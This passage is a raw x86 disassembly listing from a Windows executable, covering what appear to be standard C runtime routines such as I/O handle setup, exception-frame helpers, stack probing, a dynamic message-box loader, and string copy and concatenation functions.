  4234aa:	call   DWORD PTR ds:0x428048
  4234b0:	mov    eax,edi
  4234b2:	pop    edi
  4234b3:	pop    esi
  4234b4:	pop    ebp
  4234b5:	pop    ebx
  4234b6:	pop    ecx
  4234b7:	pop    ecx
  4234b8:	ret    
  4234b9:	sub    esp,0x48
  4234bc:	push   ebx
  4234bd:	mov    ebx,0x480
  4234c2:	push   ebx
  4234c3:	call   0x4245d2
  4234c8:	test   eax,eax
  4234ca:	pop    ecx
  4234cb:	jne    0x4234d5
  4234cd:	or     eax,0xffffffff
  4234d0:	jmp    0x4236b2
  4234d5:	mov    ds:0x45d160,eax
  4234da:	mov    DWORD PTR ds:0x45d148,0x20
  4234e4:	lea    ecx,[eax+0x480]
  4234ea:	jmp    0x42350a
  4234ec:	and    BYTE PTR [eax+0x4],0x0
  4234f0:	or     DWORD PTR [eax],0xffffffff
  4234f3:	and    DWORD PTR [eax+0x8],0x0
  4234f7:	mov    BYTE PTR [eax+0x5],0xa
  4234fb:	mov    ecx,DWORD PTR ds:0x45d160
  423501:	add    eax,0x24
  423504:	add    ecx,0x480
  42350a:	cmp    eax,ecx
  42350c:	jb     0x4234ec
  42350e:	push   ebp
  42350f:	push   esi
  423510:	push   edi
  423511:	lea    eax,[esp+0x14]
  423515:	push   eax
  423516:	call   DWORD PTR ds:0x428020
  42351c:	cmp    WORD PTR [esp+0x46],0x0
  423522:	je     0x423611
  423528:	mov    eax,DWORD PTR [esp+0x48]
  42352c:	test   eax,eax
  42352e:	je     0x423611
  423534:	mov    edi,DWORD PTR [eax]
  423536:	lea    ebp,[eax+0x4]
  423539:	lea    eax,[edi+ebp*1]
  42353c:	mov    DWORD PTR [esp+0x10],eax
  423540:	mov    eax,0x800
  423545:	cmp    edi,eax
  423547:	jl     0x42354b
  423549:	mov    edi,eax
  42354b:	cmp    DWORD PTR ds:0x45d148,edi
  423551:	jge    0x4235a1
  423553:	mov    esi,0x45d164
  423558:	push   ebx
  423559:	call   0x4245d2
  42355e:	test   eax,eax
  423560:	pop    ecx
  423561:	je     0x42359b
  423563:	add    DWORD PTR ds:0x45d148,0x20
  42356a:	mov    DWORD PTR [esi],eax
  42356c:	lea    ecx,[eax+0x480]
  423572:	jmp    0x42358a
  423574:	and    BYTE PTR [eax+0x4],0x0
  423578:	or     DWORD PTR [eax],0xffffffff
  42357b:	and    DWORD PTR [eax+0x8],0x0
  42357f:	mov    BYTE PTR [eax+0x5],0xa
  423583:	mov    ecx,DWORD PTR [esi]
  423585:	add    eax,0x24
  423588:	add    ecx,ebx
  42358a:	cmp    eax,ecx
  42358c:	jb     0x423574
  42358e:	add    esi,0x4
  423591:	cmp    DWORD PTR ds:0x45d148,edi
  423597:	jl     0x423558
  423599:	jmp    0x4235a1
  42359b:	mov    edi,DWORD PTR ds:0x45d148
  4235a1:	xor    ebx,ebx
  4235a3:	test   edi,edi
  4235a5:	jle    0x423611
  4235a7:	mov    eax,DWORD PTR [esp+0x10]
  4235ab:	mov    eax,DWORD PTR [eax]
  4235ad:	cmp    eax,0xffffffff
  4235b0:	je     0x423606
  4235b2:	mov    cl,BYTE PTR [ebp+0x0]
  4235b5:	test   cl,0x1
  4235b8:	je     0x423606
  4235ba:	test   cl,0x8
  4235bd:	jne    0x4235ca
  4235bf:	push   eax
  4235c0:	call   DWORD PTR ds:0x428060
  4235c6:	test   eax,eax
  4235c8:	je     0x423606
  4235ca:	mov    ecx,ebx
  4235cc:	mov    eax,ebx
  4235ce:	and    eax,0x1f
  4235d1:	lea    eax,[eax+eax*8]
  4235d4:	sar    ecx,0x5
  4235d7:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  4235de:	lea    esi,[ecx+eax*4]
  4235e1:	mov    eax,DWORD PTR [esp+0x10]
  4235e5:	mov    eax,DWORD PTR [eax]
  4235e7:	mov    DWORD PTR [esi],eax
  4235e9:	mov    al,BYTE PTR [ebp+0x0]
  4235ec:	mov    BYTE PTR [esi+0x4],al
  4235ef:	lea    eax,[esi+0xc]
  4235f2:	push   0xfa0
  4235f7:	push   eax
  4235f8:	call   0x42493d
  4235fd:	test   eax,eax
  4235ff:	pop    ecx
  423600:	pop    ecx
  423601:	je     0x423631
  423603:	inc    DWORD PTR [esi+0x8]
  423606:	add    DWORD PTR [esp+0x10],0x4
  42360b:	inc    ebx
  42360c:	inc    ebp
  42360d:	cmp    ebx,edi
  42360f:	jl     0x4235a7
  423611:	xor    ebx,ebx
  423613:	mov    ecx,DWORD PTR ds:0x45d160
  423619:	lea    eax,[ebx+ebx*8]
  42361c:	lea    esi,[ecx+eax*4]
  42361f:	cmp    DWORD PTR [esi],0xffffffff
  423622:	jne    0x423693
  423624:	test   ebx,ebx
  423626:	mov    BYTE PTR [esi+0x4],0x81
  42362a:	jne    0x423636
  42362c:	push   0xfffffff6
  42362e:	pop    eax
  42362f:	jmp    0x423640
  423631:	or     eax,0xffffffff
  423634:	jmp    0x4236af
  423636:	mov    eax,ebx
  423638:	dec    eax
  423639:	neg    eax
  42363b:	sbb    eax,eax
  42363d:	add    eax,0xfffffff5
  423640:	push   eax
  423641:	call   DWORD PTR ds:0x42803c
  423647:	mov    edi,eax
  423649:	cmp    edi,0xffffffff
  42364c:	je     0x42368d
  42364e:	push   edi
  42364f:	call   DWORD PTR ds:0x428060
  423655:	test   eax,eax
  423657:	je     0x42368d
  423659:	and    eax,0xff
  42365e:	cmp    eax,0x2
  423661:	mov    DWORD PTR [esi],edi
  423663:	jne    0x42366b
  423665:	or     BYTE PTR [esi+0x4],0x40
  423669:	jmp    0x423674
  42366b:	cmp    eax,0x3
  42366e:	jne    0x423674
  423670:	or     BYTE PTR [esi+0x4],0x8
  423674:	lea    eax,[esi+0xc]
  423677:	push   0xfa0
  42367c:	push   eax
  42367d:	call   0x42493d
  423682:	test   eax,eax
  423684:	pop    ecx
  423685:	pop    ecx
  423686:	je     0x423631
  423688:	inc    DWORD PTR [esi+0x8]
  42368b:	jmp    0x423697
  42368d:	or     BYTE PTR [esi+0x4],0x40
  423691:	jmp    0x423697
  423693:	or     BYTE PTR [esi+0x4],0x80
  423697:	inc    ebx
  423698:	cmp    ebx,0x3
  42369b:	jl     0x423613
  4236a1:	push   DWORD PTR ds:0x45d148
  4236a7:	call   DWORD PTR ds:0x42805c
  4236ad:	xor    eax,eax
  4236af:	pop    edi
  4236b0:	pop    esi
  4236b1:	pop    ebp
  4236b2:	pop    ebx
  4236b3:	add    esp,0x48
  4236b6:	ret    
  4236b7:	push   0xc
  4236b9:	push   0x4284a8
  4236be:	call   0x4238a8
  4236c3:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236ca:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236d1:	jae    0x4236f5
  4236d3:	and    DWORD PTR [ebp-0x4],0x0
  4236d7:	mov    eax,DWORD PTR [ebp-0x1c]
  4236da:	mov    eax,DWORD PTR [eax]
  4236dc:	test   eax,eax
  4236de:	je     0x4236eb
  4236e0:	call   eax
  4236e2:	jmp    0x4236eb
  4236e4:	xor    eax,eax
  4236e6:	inc    eax
  4236e7:	ret    
  4236e8:	mov    esp,DWORD PTR [ebp-0x18]
  4236eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236ef:	add    DWORD PTR [ebp-0x1c],0x4
  4236f3:	jmp    0x4236ca
  4236f5:	call   0x4238e3
  4236fa:	ret    
  4236fb:	push   0xc
  4236fd:	push   0x4284b8
  423702:	call   0x4238a8
  423707:	mov    DWORD PTR [ebp-0x1c],0x428f08
  42370e:	cmp    DWORD PTR [ebp-0x1c],0x428f08
  423715:	jae    0x423739
  423717:	and    DWORD PTR [ebp-0x4],0x0
  42371b:	mov    eax,DWORD PTR [ebp-0x1c]
  42371e:	mov    eax,DWORD PTR [eax]
  423720:	test   eax,eax
  423722:	je     0x42372f
  423724:	call   eax
  423726:	jmp    0x42372f
  423728:	xor    eax,eax
  42372a:	inc    eax
  42372b:	ret    
  42372c:	mov    esp,DWORD PTR [ebp-0x18]
  42372f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423733:	add    DWORD PTR [ebp-0x1c],0x4
  423737:	jmp    0x42370e
  423739:	call   0x4238e3
  42373e:	ret    
  42373f:	call   0x423986
  423744:	mov    eax,ds:0x45c304
  423749:	cmp    eax,0xffffffff
  42374c:	je     0x42375c
  42374e:	push   eax
  42374f:	call   DWORD PTR ds:0x428068
  423755:	or     DWORD PTR ds:0x45c304,0xffffffff
  42375c:	ret    
  42375d:	push   ebx
  42375e:	push   esi
  42375f:	call   DWORD PTR ds:0x428014
  423765:	push   DWORD PTR ds:0x45c304
  42376b:	mov    ebx,eax
  42376d:	call   DWORD PTR ds:0x428078
  423773:	mov    esi,eax
  423775:	test   esi,esi
  423777:	jne    0x4237c2
  423779:	push   0x88
  42377e:	push   0x1
  423780:	call   0x4249c8
  423785:	mov    esi,eax
  423787:	test   esi,esi
  423789:	pop    ecx
  42378a:	pop    ecx
  42378b:	je     0x4237ba
  42378d:	push   esi
  42378e:	push   DWORD PTR ds:0x45c304
  423794:	call   DWORD PTR ds:0x428074
  42379a:	test   eax,eax
  42379c:	je     0x4237ba
  42379e:	mov    DWORD PTR [esi+0x54],0x45c258
  4237a5:	mov    DWORD PTR [esi+0x14],0x1
  4237ac:	call   DWORD PTR ds:0x428070
  4237b2:	or     DWORD PTR [esi+0x4],0xffffffff
  4237b6:	mov    DWORD PTR [esi],eax
  4237b8:	jmp    0x4237c2
  4237ba:	push   0x10
  4237bc:	call   0x422970
  4237c1:	pop    ecx
  4237c2:	push   ebx
  4237c3:	call   DWORD PTR ds:0x42806c
  4237c9:	mov    eax,esi
  4237cb:	pop    esi
  4237cc:	pop    ebx
  4237cd:	ret    
  4237ce:	call   0x42393d
  4237d3:	test   eax,eax
  4237d5:	je     0x4237e7
  4237d7:	call   DWORD PTR ds:0x42807c
  4237dd:	cmp    eax,0xffffffff
  4237e0:	mov    ds:0x45c304,eax
  4237e5:	jne    0x4237ef
  4237e7:	call   0x42373f
  4237ec:	xor    eax,eax
  4237ee:	ret    
  4237ef:	push   esi
  4237f0:	push   0x88
  4237f5:	push   0x1
  4237f7:	call   0x4249c8
  4237fc:	mov    esi,eax
  4237fe:	test   esi,esi
  423800:	pop    ecx
  423801:	pop    ecx
  423802:	je     0x423834
  423804:	push   esi
  423805:	push   DWORD PTR ds:0x45c304
  42380b:	call   DWORD PTR ds:0x428074
  423811:	test   eax,eax
  423813:	je     0x423834
  423815:	mov    DWORD PTR [esi+0x54],0x45c258
  42381c:	mov    DWORD PTR [esi+0x14],0x1
  423823:	call   DWORD PTR ds:0x428070
  423829:	or     DWORD PTR [esi+0x4],0xffffffff
  42382d:	mov    DWORD PTR [esi],eax
  42382f:	xor    eax,eax
  423831:	inc    eax
  423832:	pop    esi
  423833:	ret    
  423834:	call   0x42373f
  423839:	xor    eax,eax
  42383b:	pop    esi
  42383c:	ret    
  42383d:	cmp    DWORD PTR ds:0x45cac4,0x2
  423844:	jne    0x423853
  423846:	cmp    DWORD PTR ds:0x45cad0,0x5
  42384d:	jb     0x423853
  42384f:	xor    eax,eax
  423851:	inc    eax
  423852:	ret    
  423853:	push   0x3
  423855:	pop    eax
  423856:	ret    
  423857:	xor    eax,eax
  423859:	cmp    DWORD PTR [esp+0x4],eax
  42385d:	push   0x0
  42385f:	sete   al
  423862:	push   0x1000
  423867:	push   eax
  423868:	call   DWORD PTR ds:0x428084
  42386e:	test   eax,eax
  423870:	mov    ds:0x45d140,eax
  423875:	je     0x4238a1
  423877:	call   0x42383d
  42387c:	cmp    eax,0x3
  42387f:	mov    ds:0x45d144,eax
  423884:	jne    0x4238a4
  423886:	push   0x3f8
  42388b:	call   0x424c4a
  423890:	test   eax,eax
  423892:	pop    ecx
  423893:	jne    0x4238a4
  423895:	push   DWORD PTR ds:0x45d140
  42389b:	call   DWORD PTR ds:0x428080
  4238a1:	xor    eax,eax
  4238a3:	ret    
  4238a4:	xor    eax,eax
  4238a6:	inc    eax
  4238a7:	ret    
  4238a8:	push   0x425778
  4238ad:	mov    eax,fs:0x0
  4238b3:	push   eax
  4238b4:	mov    eax,DWORD PTR [esp+0x10]
  4238b8:	mov    DWORD PTR [esp+0x10],ebp
  4238bc:	lea    ebp,[esp+0x10]
  4238c0:	sub    esp,eax
  4238c2:	push   ebx
  4238c3:	push   esi
  4238c4:	push   edi
  4238c5:	mov    eax,DWORD PTR [ebp-0x8]
  4238c8:	mov    DWORD PTR [ebp-0x18],esp
  4238cb:	push   eax
  4238cc:	mov    eax,DWORD PTR [ebp-0x4]
  4238cf:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4238d6:	mov    DWORD PTR [ebp-0x8],eax
  4238d9:	lea    eax,[ebp-0x10]
  4238dc:	mov    fs:0x0,eax
  4238e2:	ret    
  4238e3:	mov    ecx,DWORD PTR [ebp-0x10]
  4238e6:	mov    DWORD PTR fs:0x0,ecx
  4238ed:	pop    ecx
  4238ee:	pop    edi
  4238ef:	pop    esi
  4238f0:	pop    ebx
  4238f1:	leave  
  4238f2:	push   ecx
  4238f3:	ret    
  4238f4:	int3   
  4238f5:	int3   
  4238f6:	int3   
  4238f7:	int3   
  4238f8:	int3   
  4238f9:	int3   
  4238fa:	int3   
  4238fb:	int3   
  4238fc:	int3   
  4238fd:	int3   
  4238fe:	int3   
  4238ff:	int3   
  423900:	cmp    eax,0x1000
  423905:	jae    0x423915
  423907:	neg    eax
  423909:	add    eax,esp
  42390b:	add    eax,0x4
  42390e:	test   DWORD PTR [eax],eax
  423910:	xchg   esp,eax
  423911:	mov    eax,DWORD PTR [eax]
  423913:	push   eax
  423914:	ret    
  423915:	push   ecx
  423916:	lea    ecx,[esp+0x8]
  42391a:	sub    ecx,0x1000
  423920:	sub    eax,0x1000
  423925:	test   DWORD PTR [ecx],eax
  423927:	cmp    eax,0x1000
  42392c:	jae    0x42391a
  42392e:	sub    ecx,eax
  423930:	mov    eax,esp
  423932:	test   DWORD PTR [ecx],eax
  423934:	mov    esp,ecx
  423936:	mov    ecx,DWORD PTR [eax]
  423938:	mov    eax,DWORD PTR [eax+0x4]
  42393b:	push   eax
  42393c:	ret    
  42393d:	push   esi
  42393e:	push   edi
  42393f:	xor    esi,esi
  423941:	mov    edi,0x45cc20
  423946:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  42394e:	jne    0x42396e
  423950:	lea    eax,[esi*8+0x45c310]
  423957:	mov    DWORD PTR [eax],edi
  423959:	push   0xfa0
  42395e:	push   DWORD PTR [eax]
  423960:	add    edi,0x18
  423963:	call   0x42493d
  423968:	test   eax,eax
  42396a:	pop    ecx
  42396b:	pop    ecx
  42396c:	je     0x42397a
  42396e:	inc    esi
  42396f:	cmp    esi,0x24
  423972:	jl     0x423946
  423974:	xor    eax,eax
  423976:	inc    eax
  423977:	pop    edi
  423978:	pop    esi
  423979:	ret    
  42397a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423982:	xor    eax,eax
  423984:	jmp    0x423977
  423986:	push   ebx
  423987:	mov    ebx,DWORD PTR ds:0x428064
  42398d:	push   esi
  42398e:	mov    esi,0x45c310
  423993:	push   edi
  423994:	mov    edi,DWORD PTR [esi]
  423996:	test   edi,edi
  423998:	je     0x4239ad
  42399a:	cmp    DWORD PTR [esi+0x4],0x1
  42399e:	je     0x4239ad
  4239a0:	push   edi
  4239a1:	call   ebx
  4239a3:	push   edi
  4239a4:	call   0x4244ba
  4239a9:	and    DWORD PTR [esi],0x0
  4239ac:	pop    ecx
  4239ad:	add    esi,0x8
  4239b0:	cmp    esi,0x45c430
  4239b6:	jl     0x423994
  4239b8:	mov    esi,0x45c310
  4239bd:	pop    edi
  4239be:	mov    eax,DWORD PTR [esi]
  4239c0:	test   eax,eax
  4239c2:	je     0x4239cd
  4239c4:	cmp    DWORD PTR [esi+0x4],0x1
  4239c8:	jne    0x4239cd
  4239ca:	push   eax
  4239cb:	call   ebx
  4239cd:	add    esi,0x8
  4239d0:	cmp    esi,0x45c430
  4239d6:	jl     0x4239be
  4239d8:	pop    esi
  4239d9:	pop    ebx
  4239da:	ret    
  4239db:	push   ebp
  4239dc:	mov    ebp,esp
  4239de:	mov    eax,DWORD PTR [ebp+0x8]
  4239e1:	push   DWORD PTR [eax*8+0x45c310]
  4239e8:	call   DWORD PTR ds:0x428090
  4239ee:	pop    ebp
  4239ef:	ret    
  4239f0:	push   ebp
  4239f1:	mov    ebp,esp
  4239f3:	push   esi
  4239f4:	mov    esi,DWORD PTR [ebp+0x8]
  4239f7:	lea    esi,[esi*8+0x45c310]
  4239fe:	cmp    DWORD PTR [esi],0x0
  423a01:	je     0x423a08
  423a03:	xor    eax,eax
  423a05:	inc    eax
  423a06:	jmp    0x423a6c
  423a08:	push   edi
  423a09:	push   0x18
  423a0b:	call   0x4245d2
  423a10:	mov    edi,eax
  423a12:	test   edi,edi
  423a14:	pop    ecx
  423a15:	jne    0x423a26
  423a17:	call   0x425850
  423a1c:	mov    DWORD PTR [eax],0xc
  423a22:	xor    eax,eax
  423a24:	jmp    0x423a6b
  423a26:	push   0xa
  423a28:	call   0x423a6f
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	pop    ecx
  423a31:	jne    0x423a59
  423a33:	push   0xfa0
  423a38:	push   edi
  423a39:	call   0x42493d
  423a3e:	test   eax,eax
  423a40:	pop    ecx
  423a41:	pop    ecx
  423a42:	jne    0x423a55
  423a44:	push   edi
  423a45:	call   0x4244ba
  423a4a:	push   0xa
  423a4c:	call   0x4239db
  423a51:	pop    ecx
  423a52:	pop    ecx
  423a53:	jmp    0x423a17
  423a55:	mov    DWORD PTR [esi],edi
  423a57:	jmp    0x423a60
  423a59:	push   edi
  423a5a:	call   0x4244ba
  423a5f:	pop    ecx
  423a60:	push   0xa
  423a62:	call   0x4239db
  423a67:	xor    eax,eax
  423a69:	pop    ecx
  423a6a:	inc    eax
  423a6b:	pop    edi
  423a6c:	pop    esi
  423a6d:	pop    ebp
  423a6e:	ret    
  423a6f:	push   ebp
  423a70:	mov    ebp,esp
  423a72:	mov    eax,DWORD PTR [ebp+0x8]
  423a75:	push   esi
  423a76:	lea    esi,[eax*8+0x45c310]
  423a7d:	cmp    DWORD PTR [esi],0x0
  423a80:	jne    0x423a95
  423a82:	push   eax
  423a83:	call   0x4239f0
  423a88:	test   eax,eax
  423a8a:	pop    ecx
  423a8b:	jne    0x423a95
  423a8d:	push   0x11
  423a8f:	call   0x422970
  423a94:	pop    ecx
  423a95:	push   DWORD PTR [esi]
  423a97:	call   DWORD PTR ds:0x428094
  423a9d:	pop    esi
  423a9e:	pop    ebp
  423a9f:	ret    
  423aa0:	push   esi
  423aa1:	push   DWORD PTR ds:0x45d268
  423aa7:	call   0x425a06
  423aac:	pop    ecx
  423aad:	mov    ecx,DWORD PTR ds:0x45d264
  423ab3:	mov    esi,eax
  423ab5:	mov    eax,ds:0x45d268
  423aba:	mov    edx,ecx
  423abc:	sub    edx,eax
  423abe:	add    edx,0x4
  423ac1:	cmp    esi,edx
  423ac3:	jae    0x423b13
  423ac5:	mov    ecx,0x800
  423aca:	cmp    esi,ecx
  423acc:	jae    0x423ad0
  423ace:	mov    ecx,esi
  423ad0:	add    ecx,esi
  423ad2:	push   ecx
  423ad3:	push   eax
  423ad4:	call   0x425859
  423ad9:	test   eax,eax
  423adb:	pop    ecx
  423adc:	pop    ecx
  423add:	jne    0x423af6
  423adf:	add    esi,0x10
  423ae2:	push   esi
  423ae3:	push   DWORD PTR ds:0x45d268
  423ae9:	call   0x425859
  423aee:	test   eax,eax
  423af0:	pop    ecx
  423af1:	pop    ecx
  423af2:	jne    0x423af6
  423af4:	pop    esi
  423af5:	ret    
  423af6:	mov    ecx,DWORD PTR ds:0x45d264
  423afc:	sub    ecx,DWORD PTR ds:0x45d268
  423b02:	mov    ds:0x45d268,eax
  423b07:	sar    ecx,0x2
  423b0a:	lea    ecx,[eax+ecx*4]
  423b0d:	mov    DWORD PTR ds:0x45d264,ecx
  423b13:	mov    DWORD PTR [ecx],edi
  423b15:	add    DWORD PTR ds:0x45d264,0x4
  423b1c:	mov    eax,edi
  423b1e:	pop    esi
  423b1f:	ret    
  423b20:	push   0x80
  423b25:	call   0x4245d2
  423b2a:	test   eax,eax
  423b2c:	pop    ecx
  423b2d:	mov    ds:0x45d268,eax
  423b32:	jne    0x423b38
  423b34:	push   0x18
  423b36:	pop    eax
  423b37:	ret    
  423b38:	and    DWORD PTR [eax],0x0
  423b3b:	mov    eax,ds:0x45d268
  423b40:	mov    ds:0x45d264,eax
  423b45:	xor    eax,eax
  423b47:	ret    
  423b48:	push   0xc
  423b4a:	push   0x4284c8
  423b4f:	call   0x4238a8
  423b54:	call   0x422bbb
  423b59:	and    DWORD PTR [ebp-0x4],0x0
  423b5d:	mov    edi,DWORD PTR [ebp+0x8]
  423b60:	call   0x423aa0
  423b65:	mov    DWORD PTR [ebp-0x1c],eax
  423b68:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b6c:	call   0x423b7a
  423b71:	mov    eax,DWORD PTR [ebp-0x1c]
  423b74:	call   0x4238e3
  423b79:	ret    
  423b7a:	call   0x422bc4
  423b7f:	ret    
  423b80:	push   DWORD PTR [esp+0x4]
  423b84:	call   0x423b48
  423b89:	neg    eax
  423b8b:	sbb    eax,eax
  423b8d:	neg    eax
  423b8f:	pop    ecx
  423b90:	dec    eax
  423b91:	ret    
  423b92:	push   ebp
  423b93:	mov    ebp,esp
  423b95:	sub    esp,0x10
  423b98:	push   ebx
  423b99:	xor    ebx,ebx
  423b9b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423ba1:	push   esi
  423ba2:	push   edi
  423ba3:	jne    0x423c12
  423ba5:	push   0x428538
  423baa:	call   DWORD PTR ds:0x428098
  423bb0:	mov    edi,eax
  423bb2:	cmp    edi,ebx
  423bb4:	je     0x423c4d
  423bba:	mov    esi,DWORD PTR ds:0x42801c
  423bc0:	push   0x42852c
  423bc5:	push   edi
  423bc6:	call   esi
  423bc8:	test   eax,eax
  423bca:	mov    ds:0x45cd70,eax
  423bcf:	je     0x423c4d
  423bd1:	push   0x42851c
  423bd6:	push   edi
  423bd7:	call   esi
  423bd9:	push   0x428508
  423bde:	push   edi
  423bdf:	mov    ds:0x45cd74,eax
  423be4:	call   esi
  423be6:	cmp    DWORD PTR ds:0x45cac4,0x2
  423bed:	mov    ds:0x45cd78,eax
  423bf2:	jne    0x423c12
  423bf4:	push   0x4284ec
  423bf9:	push   edi
  423bfa:	call   esi
  423bfc:	test   eax,eax
  423bfe:	mov    ds:0x45cd80,eax
  423c03:	je     0x423c12
  423c05:	push   0x4284d4
  423c0a:	push   edi
  423c0b:	call   esi
  423c0d:	mov    ds:0x45cd7c,eax
  423c12:	mov    eax,ds:0x45cd7c
  423c17:	test   eax,eax
  423c19:	je     0x423c57
  423c1b:	call   eax
  423c1d:	test   eax,eax
  423c1f:	je     0x423c3e
  423c21:	lea    ecx,[ebp-0x4]
  423c24:	push   ecx
  423c25:	push   0xc
  423c27:	lea    ecx,[ebp-0x10]
  423c2a:	push   ecx
  423c2b:	push   0x1
  423c2d:	push   eax
  423c2e:	call   DWORD PTR ds:0x45cd80
  423c34:	test   eax,eax
  423c36:	je     0x423c3e
  423c38:	test   BYTE PTR [ebp-0x8],0x1
  423c3c:	jne    0x423c57
  423c3e:	cmp    DWORD PTR ds:0x45cad0,0x4
  423c45:	jb     0x423c51
  423c47:	or     BYTE PTR [ebp+0x12],0x20
  423c4b:	jmp    0x423c76
  423c4d:	xor    eax,eax
  423c4f:	jmp    0x423c86
  423c51:	or     BYTE PTR [ebp+0x12],0x4
  423c55:	jmp    0x423c76
  423c57:	mov    eax,ds:0x45cd74
  423c5c:	test   eax,eax
  423c5e:	je     0x423c76
  423c60:	call   eax
  423c62:	mov    ebx,eax
  423c64:	test   ebx,ebx
  423c66:	je     0x423c76
  423c68:	mov    eax,ds:0x45cd78
  423c6d:	test   eax,eax
  423c6f:	je     0x423c76
  423c71:	push   ebx
  423c72:	call   eax
  423c74:	mov    ebx,eax
  423c76:	push   DWORD PTR [ebp+0x10]
  423c79:	push   DWORD PTR [ebp+0xc]
  423c7c:	push   DWORD PTR [ebp+0x8]
  423c7f:	push   ebx
  423c80:	call   DWORD PTR ds:0x45cd70
  423c86:	pop    edi
  423c87:	pop    esi
  423c88:	pop    ebx
  423c89:	leave  
  423c8a:	ret    
  423c8b:	int3   
  423c8c:	int3   
  423c8d:	int3   
  423c8e:	int3   
  423c8f:	int3   
  423c90:	push   edi
  423c91:	mov    edi,DWORD PTR [esp+0x8]
  423c95:	jmp    0x423d05
  423c97:	lea    esp,[esp+0x0]
  423c9e:	mov    edi,edi
  423ca0:	mov    ecx,DWORD PTR [esp+0x4]
  423ca4:	push   edi
  423ca5:	test   ecx,0x3
  423cab:	je     0x423cc0
  423cad:	mov    al,BYTE PTR [ecx]
  423caf:	add    ecx,0x1
  423cb2:	test   al,al
  423cb4:	je     0x423cf3
  423cb6:	test   ecx,0x3
  423cbc:	jne    0x423cad
  423cbe:	mov    edi,edi
  423cc0:	mov    eax,DWORD PTR [ecx]
  423cc2:	mov    edx,0x7efefeff
  423cc7:	add    edx,eax
  423cc9:	xor    eax,0xffffffff
  423ccc:	xor    eax,edx
  423cce:	add    ecx,0x4
  423cd1:	test   eax,0x81010100
  423cd6:	je     0x423cc0
  423cd8:	mov    eax,DWORD PTR [ecx-0x4]
  423cdb:	test   al,al
  423cdd:	je     0x423d02
  423cdf:	test   ah,ah
  423ce1:	je     0x423cfd
  423ce3:	test   eax,0xff0000
  423ce8:	je     0x423cf8
  423cea:	test   eax,0xff000000
  423cef:	je     0x423cf3
  423cf1:	jmp    0x423cc0
  423cf3:	lea    edi,[ecx-0x1]
  423cf6:	jmp    0x423d05
  423cf8:	lea    edi,[ecx-0x2]
  423cfb:	jmp    0x423d05
  423cfd:	lea    edi,[ecx-0x3]
  423d00:	jmp    0x423d05
  423d02:	lea    edi,[ecx-0x4]
  423d05:	mov    ecx,DWORD PTR [esp+0xc]
  423d09:	test   ecx,0x3
  423d0f:	je     0x423d2e
  423d11:	mov    dl,BYTE PTR [ecx]
  423d13:	add    ecx,0x1
  423d16:	test   dl,dl
  423d18:	je     0x423d80
  423d1a:	mov    BYTE PTR [edi],dl
  423d1c:	add    edi,0x1
  423d1f:	test   ecx,0x3
  423d25:	jne    0x423d11
  423d27:	jmp    0x423d2e
  423d29:	mov    DWORD PTR [edi],edx
  423d2b:	add    edi,0x4
  423d2e:	mov    edx,0x7efefeff
  423d33:	mov    eax,DWORD PTR [ecx]
  423d35:	add    edx,eax
  423d37:	xor    eax,0xffffffff
  423d3a:	xor    eax,edx
  423d3c:	mov    edx,DWORD PTR [ecx]
  423d3e:	add    ecx,0x4
  423d41:	test   eax,0x81010100
  423d46:	je     0x423d29
  423d48:	test   dl,dl
  423d4a:	je     0x423d80
  423d4c:	test   dh,dh
  423d4e:	je     0x423d77
  423d50:	test   edx,0xff0000
  423d56:	je     0x423d6a
  423d58:	test   edx,0xff000000
  423d5e:	je     0x423d62
  423d60:	jmp    0x423d29
  423d62:	mov    DWORD PTR [edi],edx
  423d64:	mov    eax,DWORD PTR [esp+0x8]
  423d68:	pop    edi
  423d69:	ret    
  423d6a:	mov    WORD PTR [edi],dx
  423d6d:	mov    eax,DWORD PTR [esp+0x8]
  423d71:	mov    BYTE PTR [edi+0x2],0x0
  423d75:	pop    edi
  423d76:	ret    
  423d77:	mov    WORD PTR [edi],dx
  423d7a:	mov    eax,DWORD PTR [esp+0x8]
  423d7e:	pop    edi
  423d7f:	ret    
  423d80:	mov    BYTE PTR [edi],dl
  423d82:	mov    eax,DWORD PTR [esp+0x8]
  423d86:	pop    edi
  423d87:	ret    
  423d88:	int3   
  423d89:	int3   
  423d8a:	int3   
  423d8b:	int3   
  423d8c:	int3   
  423d8d:	int3   
  423d8e:	int3   
  423d8f:	int3   
  423d90:	mov    ecx,DWORD PTR [esp+0xc]
  423d94:	push   edi
  423d95:	test   ecx,ecx
  423d97:	je     0x423e2f
  423d9d:	push   esi
  423d9e:	push   ebx
  423d9f:	mov    ebx,ecx
  423da1:	mov    esi,DWORD PTR [esp+0x14]
  423da5:	test   esi,0x3
  423dab:	mov    edi,DWORD PTR [esp+0x10]
  423daf:	jne    0x423dbc
  423db1:	shr    ecx,0x2
  423db4:	jne    0x423e3f
  423dba:	jmp    0x423de3
  423dbc:	mov    al,BYTE PTR [esi]
  423dbe:	add    esi,0x1
  423dc1:	mov    BYTE PTR [edi],al
  423dc3:	add    edi,0x1
  423dc6:	sub    ecx,0x1
  423dc9:	je     0x423df6
  423dcb:	test   al,al
  423dcd:	je     0x423dfe
  423dcf:	test   esi,0x3
  423dd5:	jne    0x423dbc
  423dd7:	mov    ebx,ecx
  423dd9:	shr    ecx,0x2
  423ddc:	jne    0x423e3f
  423dde:	and    ebx,0x3
  423de1:	je     0x423df6
  423de3:	mov    al,BYTE PTR [esi]
  423de5:	add    esi,0x1
  423de8:	mov    BYTE PTR [edi],al
  423dea:	add    edi,0x1
  423ded:	test   al,al
  423def:	je     0x423e28
  423df1:	sub    ebx,0x1
  423df4:	jne    0x423de3
  423df6:	mov    eax,DWORD PTR [esp+0x10]
  423dfa:	pop    ebx
  423dfb:	pop    esi
  423dfc:	pop    edi
  423dfd:	ret    
  423dfe:	test   edi,0x3
  423e04:	je     0x423e1c
  423e06:	mov    BYTE PTR [edi],al
  423e08:	add    edi,0x1
  423e0b:	sub    ecx,0x1
  423e0e:	je     0x423eac
  423e14:	test   edi,0x3
  423e1a:	jne    0x423e06
  423e1c:	mov    ebx,ecx
  423e1e:	shr    ecx,0x2
  423e21:	jne    0x423e97
